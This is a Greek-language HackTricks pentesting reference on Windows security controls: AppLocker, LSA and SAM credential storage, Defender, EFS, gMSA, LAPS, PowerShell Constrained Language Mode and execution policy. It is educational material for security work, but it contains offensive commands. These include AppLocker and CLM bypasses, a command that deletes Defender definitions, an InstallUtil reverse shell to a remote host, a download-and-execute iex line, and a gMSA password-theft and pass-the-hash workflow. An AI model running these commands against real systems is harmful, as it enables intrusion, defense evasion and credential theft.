# Έλεγχοι Ασφαλείας Windows

{{#include ../../banners/hacktricks-training.md}}

## Πολιτική AppLocker

Μια λίστα επιτρεπόμενων εφαρμογών (application whitelist) είναι μια λίστα εγκεκριμένων εφαρμογών ή εκτελέσιμων αρχείων που επιτρέπεται να βρίσκονται και να εκτελούνται σε ένα σύστημα. Ο στόχος είναι να προστατευτεί το περιβάλλον από κακόβουλο λογισμικό (malware) και μη εγκεκριμένο λογισμικό που δεν ευθυγραμμίζεται με τις συγκεκριμένες επιχειρηματικές ανάγκες ενός οργανισμού.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) είναι η λύση της Microsoft για application whitelisting και δίνει στους διαχειριστές συστήματος έλεγχο σχετικά με **ποια εφαρμογές και αρχεία μπορούν να εκτελέσουν οι χρήστες**. Παρέχει **λεπτομερή έλεγχο** πάνω σε executables, scripts, Windows installer files, DLLs, packaged apps, και packed app installers.\
Είναι σύνηθες οι οργανισμοί να **block cmd.exe and PowerShell.exe** και να περιορίζουν το write access σε ορισμένους καταλόγους, **but this can all be bypassed**.

### Έλεγχος

Ελέγξτε ποια αρχεία/επεκτάσεις είναι blacklisted/whitelisted:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Αυτή η διαδρομή μητρώου περιέχει τις ρυθμίσεις και τις πολιτικές που εφαρμόζονται από το AppLocker, παρέχοντας έναν τρόπο να εξετάσετε το τρέχον σύνολο κανόνων που επιβάλλονται στο σύστημα:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Χρήσιμα **Writable folders** για να παρακάμψετε την AppLocker Policy: Εάν το AppLocker επιτρέπει την εκτέλεση οτιδήποτε μέσα στο `C:\Windows\System32` ή στο `C:\Windows`, υπάρχουν **writable folders** που μπορείτε να χρησιμοποιήσετε για να **παρακάμψετε αυτό**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Συνήθως **αξιόπιστα** [**"LOLBAS's"**] binaries μπορούν επίσης να βοηθήσουν στην παράκαμψη του AppLocker.
- **Κακώς γραμμένοι κανόνες μπορούν επίσης να παρακαμφθούν**
- Για παράδειγμα, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, μπορείτε να δημιουργήσετε έναν **φάκελο ονόματι `allowed`** οπουδήποτε και θα επιτρέπεται.
- Οι οργανισμοί συχνά επικεντρώνονται στο **μπλοκάρισμα του εκτελέσιμου `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, αλλά ξεχνούν τις **άλλες** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) όπως `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ή `PowerShell_ISE.exe`.
- Η επιβολή DLL σπανίως ενεργοποιείται λόγω του πρόσθετου φόρτου που μπορεί να επιβάλει σε ένα σύστημα και του όγκου των δοκιμών που απαιτούνται για να διασφαλιστεί ότι τίποτα δεν θα σπάσει. Έτσι η χρήση **DLLs ως backdoors θα βοηθήσει στην παράκαμψη του AppLocker**.
- Μπορείτε να χρησιμοποιήσετε τους [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε Powershell** κώδικα σε οποιαδήποτε διεργασία και να παρακάμψετε το AppLocker. Για περισσότερες πληροφορίες δείτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Αποθήκευση Διαπιστευτηρίων

### Security Accounts Manager (SAM)

Τα τοπικά διαπιστευτήρια υπάρχουν σε αυτό το αρχείο, οι κωδικοί πρόσβασης είναι κατακερματισμένοι.

### Local Security Authority (LSA) - LSASS

Τα **διαπιστευτήρια** (κατακερματισμένα) **αποθηκεύονται** στη **μνήμη** αυτού του υποσυστήματος για λόγους Single Sign-On.\
Η **LSA** διαχειρίζεται την τοπική **πολιτική ασφαλείας** (πολιτική κωδικών, δικαιώματα χρηστών...), την **αυθεντικοποίηση**, τα **access tokens**...\
Η LSA θα είναι αυτή που θα **ελέγξει** για παρεχόμενα διαπιστευτήρια μέσα στο αρχείο **SAM** (για τοπική είσοδο) και θα **επικοινωνήσει** με τον **domain controller** για να αυθεντικοποιήσει έναν domain χρήστη.

Τα **διαπιστευτήρια** **αποθηκεύονται** μέσα στη διαδικασία **LSASS**: Kerberos tickets, NT και LM hashes, εύκολα αποκρυπτογραφούμενοι κωδικοί πρόσβασης.

### LSA secrets

Η LSA μπορεί να αποθηκεύσει στον δίσκο ορισμένα διαπιστευτήρια:

- Κωδικός πρόσβασης του λογαριασμού υπολογιστή του Active Directory (όταν ο domain controller δεν είναι προσβάσιμος).
- Κωδικοί πρόσβασης λογαριασμών υπηρεσιών Windows
- Κωδικοί πρόσβασης για προγραμματισμένες εργασίες
- Περισσότερα (π.χ. κωδικός πρόσβασης εφαρμογών IIS...)

### NTDS.dit

Είναι η βάση δεδομένων του Active Directory. Παρουσιάζεται μόνο σε Domain Controllers.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) είναι ένα Antivirus που διατίθεται στα Windows 10 και Windows 11, και σε εκδόσεις του Windows Server. Αυτό **μπλοκάρει** κοινά pentesting εργαλεία όπως το **`WinPEAS`**. Ωστόσο, υπάρχουν τρόποι να **παρακαμφθούν αυτές οι προστασίες**.

### Έλεγχος

Για να ελέγξετε την **κατάσταση** του **Defender** μπορείτε να εκτελέσετε το PS cmdlet **`Get-MpComputerStatus`** (ελέγξτε την τιμή του **`RealTimeProtectionEnabled`** για να δείτε αν είναι ενεργό):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Για να το απαριθμήσετε μπορείτε επίσης να εκτελέσετε:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Κρυπτογραφημένο Σύστημα Αρχείων (EFS)

Το EFS προστατεύει αρχεία μέσω κρυπτογράφησης, χρησιμοποιώντας ένα **συμμετρικό κλειδί** γνωστό ως **File Encryption Key (FEK)**. Αυτό το κλειδί κρυπτογραφείται με το **δημόσιο κλειδί** του χρήστη και αποθηκεύεται στη $EFS **εναλλακτική ροή δεδομένων** του κρυπτογραφημένου αρχείου. Όταν χρειάζεται αποκρυπτογράφηση, το αντίστοιχο **ιδιωτικό κλειδί** του ψηφιακού πιστοποιητικού του χρήστη χρησιμοποιείται για να αποκρυπτογραφήσει το FEK από τη ροή $EFS. Περισσότερες λεπτομέρειες μπορείτε να βρείτε [εδώ](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Σενάρια αποκρυπτογράφησης χωρίς πρωτοβουλία χρήστη** περιλαμβάνουν:

- Όταν αρχεία ή φάκελοι μετακινούνται σε μη-EFS σύστημα αρχείων, όπως [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), αποκρυπτογραφούνται αυτόματα.
- Κρυπτογραφημένα αρχεία που αποστέλλονται μέσω δικτύου με το πρωτόκολλο SMB/CIFS αποκρυπτογραφούνται πριν την αποστολή.

Αυτή η μέθοδος κρυπτογράφησης επιτρέπει **διαφανή πρόσβαση** στα κρυπτογραφημένα αρχεία για τον κάτοχο. Ωστόσο, το απλό άλλαγμα του κωδικού του κατόχου και η σύνδεση δεν επιτρέπουν την αποκρυπτογράφηση.

Κύρια σημεία:

- Το EFS χρησιμοποιεί ένα συμμετρικό FEK, κρυπτογραφημένο με το δημόσιο κλειδί του χρήστη.
- Η αποκρυπτογράφηση χρησιμοποιεί το ιδιωτικό κλειδί του χρήστη για να αποκτήσει πρόσβαση στο FEK.
- Η αυτόματη αποκρυπτογράφηση συμβαίνει υπό συγκεκριμένες συνθήκες, όπως η αντιγραφή σε FAT32 ή η μετάδοση μέσω δικτύου.
- Τα κρυπτογραφημένα αρχεία είναι προσβάσιμα από τον κάτοχο χωρίς επιπλέον ενέργειες.

### Έλεγχος πληροφοριών EFS

Ελέγξτε αν ένας **χρήστης** έχει **χρησιμοποιήσει** αυτήν την **υπηρεσία** ελέγχοντας αν υπάρχει το μονοπάτι:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Ελέγξτε **ποιος** έχει **πρόσβαση** στο αρχείο χρησιμοποιώντας cipher /c \<file>\. Μπορείτε επίσης να χρησιμοποιήσετε `cipher /e` και `cipher /d` μέσα σε έναν φάκελο για να **κρυπτογραφήσετε** και να **αποκρυπτογραφήσετε** όλα τα αρχεία.

### Αποκρυπτογράφηση αρχείων EFS

#### Εκτέλεση ως Authority System

Αυτή η μέθοδος απαιτεί ο **θιγόμενος χρήστης** να έχει **εκτελούμενη** μια **διαδικασία** στον κεντρικό υπολογιστή. Εάν συμβαίνει αυτό, χρησιμοποιώντας μια `meterpreter` συνεδρία μπορείτε να μιμηθείτε το token της διαδικασίας του χρήστη (`impersonate_token` από `incognito`). Εναλλακτικά, μπορείτε απλώς να `migrate` στη διαδικασία του χρήστη.

#### Γνωρίζοντας τον κωδικό του χρήστη


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Ομαδικοί Διαχειριζόμενοι Λογαριασμοί Υπηρεσίας (gMSA)

Η Microsoft ανέπτυξε τους **Group Managed Service Accounts (gMSA)** για να απλοποιήσει τη διαχείριση των λογαριασμών υπηρεσιών σε υποδομές IT. Σε αντίθεση με τους παραδοσιακούς λογαριασμούς υπηρεσίας που συχνά έχουν ενεργοποιημένη τη ρύθμιση "**Password never expire**", τα gMSA προσφέρουν μια πιο ασφαλή και διαχειρίσιμη λύση:

- **Αυτόματη διαχείριση κωδικών**: Τα gMSA χρησιμοποιούν έναν σύνθετο, 240-χαρακτήρων κωδικό που αλλάζει αυτόματα σύμφωνα με την πολιτική του domain ή του υπολογιστή. Αυτή τη διαδικασία αναλαμβάνει η Key Distribution Service (KDC) της Microsoft, εξαλείφοντας την ανάγκη για χειροκίνητες ενημερώσεις κωδικών.
- **Ενισχυμένη ασφάλεια**: Αυτοί οι λογαριασμοί δεν υπόκεινται σε lockouts και δεν μπορούν να χρησιμοποιηθούν για interactive logins, ενισχύοντας την ασφάλειά τους.
- **Υποστήριξη πολλαπλών hosts**: Τα gMSA μπορούν να μοιραστούν σε πολλαπλούς hosts, καθιστώντας τα ιδανικά για υπηρεσίες που τρέχουν σε πολλαπλούς servers.
- **Δυνατότητα προγραμματισμένων εργασιών**: Σε αντίθεση με τους managed service accounts, τα gMSAs υποστηρίζουν την εκτέλεση προγραμματισμένων εργασιών.
- **Απλοποιημένη διαχείριση SPN**: Το σύστημα ενημερώνει αυτόματα το Service Principal Name (SPN) όταν υπάρχουν αλλαγές στις λεπτομέρειες sAMaccount του υπολογιστή ή στο DNS name, απλοποιώντας τη διαχείριση των SPN.

Οι κωδικοί για τα gMSA αποθηκεύονται στην ιδιότητα LDAP _**msDS-ManagedPassword**_ και επαναρυθμίζονται αυτόματα κάθε 30 ημέρες από τους Domain Controllers (DCs). Αυτός ο κωδικός, ένα κρυπτογραφημένο blob δεδομένων γνωστό ως [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), μπορεί να ανακτηθεί μόνο από εξουσιοδοτημένους διαχειριστές και από τους servers στους οποίους έχουν εγκατασταθεί τα gMSAs, εξασφαλίζοντας ένα ασφαλές περιβάλλον. Για να αποκτήσετε πρόσβαση σε αυτές τις πληροφορίες απαιτείται μια ασφαλής σύνδεση όπως LDAPS, ή η σύνδεση πρέπει να είναι authenticated με 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Μπορείτε να διαβάσετε αυτόν τον κωδικό με [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Επίσης, έλεγξε αυτή τη [web page](https://cube0x0.github.io/Relaying-for-gMSA/) σχετικά με το πώς να εκτελέσεις μια **NTLM relay attack** για να **read** το **password** του **gMSA**.

### Κατάχρηση ACL chaining για να read το managed password του gMSA (GenericAll -> ReadGMSAPassword)

Σε πολλά περιβάλλοντα, χρήστες με χαμηλά προνόμια μπορούν να pivot σε gMSA secrets χωρίς DC compromise εκμεταλλευόμενοι λανθασμένα διαμορφωμένα object ACLs:

- Μια ομάδα που μπορείς να ελέγξεις (π.χ. μέσω GenericAll/GenericWrite) έχει παραχωρηθεί `ReadGMSAPassword` πάνω σε ένα gMSA.
- Προσθέτοντας τον εαυτό σου σε αυτή την ομάδα, κληρονομείς το δικαίωμα να read το `msDS-ManagedPassword` blob του gMSA μέσω LDAP και να εξάγεις usable NTLM credentials.

Τυπική ροή εργασίας:

1) Ανακάλυψε τη διαδρομή με BloodHound και σήμανε τους foothold principals σου ως Owned. Ψάξε για ακμές όπως:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Πρόσθεσε τον εαυτό σου στην ενδιάμεση ομάδα που ελέγχεις (παράδειγμα με bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Ανάγνωση του διαχειριζόμενου κωδικού gMSA μέσω LDAP και παραγωγή του NTLM hash. Το NetExec αυτοματοποιεί την εξαγωγή του `msDS-ManagedPassword` και τη μετατροπή σε NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Πιστοποιηθείτε ως το gMSA χρησιμοποιώντας το NTLM hash (δεν απαιτείται plaintext). Αν ο λογαριασμός είναι στους Remote Management Users, το WinRM θα λειτουργήσει απευθείας:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notes:
- Οι LDAP αναγνώσεις του `msDS-ManagedPassword` απαιτούν sealing (e.g., LDAPS/sign+seal). Τα εργαλεία το χειρίζονται αυτό αυτόματα.
- Οι gMSAs συχνά λαμβάνουν τοπικά δικαιώματα όπως WinRM· επαληθεύστε τη συμμετοχή σε ομάδες (e.g., Remote Management Users) για να σχεδιάσετε lateral movement.
- Αν χρειάζεστε μόνο το blob για να υπολογίσετε μόνοι σας το NTLM, δείτε τη δομή MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

Το **Local Administrator Password Solution (LAPS)**, διαθέσιμο για λήψη από [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), επιτρέπει τη διαχείριση των κωδικών του τοπικού Administrator. Αυτοί οι κωδικοί, οι οποίοι είναι **τυχαίοι**, μοναδικοί και **αλλάζουν τακτικά**, αποθηκεύονται κεντρικά στο Active Directory. Η πρόσβαση σε αυτούς τους κωδικούς περιορίζεται μέσω ACLs σε εξουσιοδοτημένους χρήστες. Εφόσον χορηγηθούν επαρκή δικαιώματα, παρέχεται η δυνατότητα ανάγνωσης των τοπικών κωδικών διαχειριστή.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

Το PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **περιορίζει πολλές από τις δυνατότητες** που χρειάζονται για την αποτελεσματική χρήση του PowerShell, όπως το μπλοκάρισμα αντικειμένων COM, η επιτρεπόμενη χρήση μόνο εγκεκριμένων τύπων .NET, ροών εργασίας βασισμένων σε XAML, κλάσεων PowerShell, και άλλα.

### **Έλεγχος**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Στα τρέχοντα Windows αυτό το Bypass δεν θα λειτουργήσει αλλά μπορείτε να χρησιμοποιήσετε[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Για να το μεταγλωττίσετε ίσως χρειαστεί** **να** _**Προσθέσετε Αναφορά**_ -> _Περιήγηση_ ->_Περιήγηση_ -> add `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` and **change the project to .Net4.5**.

#### Άμεσο Bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass the constrained mode. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## PS Execution Policy

Κατά προεπιλογή είναι ρυθμισμένο σε **restricted.** Κύριοι τρόποι για να bypass αυτή την πολιτική:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Περισσότερα μπορείτε να βρείτε [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Διεπαφή παρόχου υπηρεσιών ασφαλείας (SSPI)

Είναι το API που μπορεί να χρησιμοποιηθεί για την πιστοποίηση χρηστών.

Το SSPI αναλαμβάνει να βρει το κατάλληλο πρωτόκολλο για δύο μηχανήματα που θέλουν να επικοινωνήσουν. Η προτιμώμενη μέθοδος για αυτό είναι το Kerberos. Στη συνέχεια το SSPI θα διαπραγματευτεί ποιο πρωτόκολλο αυθεντικοποίησης θα χρησιμοποιηθεί — αυτά τα πρωτόκολλα ονομάζονται Security Support Provider (SSP), υπάρχουν σε κάθε σύστημα Windows με τη μορφή DLL και και τα δύο μηχανήματα πρέπει να υποστηρίζουν το ίδιο για να μπορούν να επικοινωνήσουν.

### Κύρια SSPs

- **Kerberos**: Το προτιμώμενο
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2**: Για λόγους συμβατότητας
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Διακομιστές web και LDAP, ο κωδικός σε μορφή MD5 hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL και TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Χρησιμοποιείται για να διαπραγματευτεί ποιο πρωτόκολλο θα χρησιμοποιηθεί (Kerberos ή NTLM, με προεπιλογή το Kerberos)
- %windir%\Windows\System32\lsasrv.dll

#### Η διαπραγμάτευση μπορεί να προσφέρει πολλαπλές μεθόδους ή μόνο μία.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια λειτουργία που εμφανίζει μια **προτροπή συγκατάθεσης για ενέργειες με αυξημένα δικαιώματα**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## Αναφορές

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
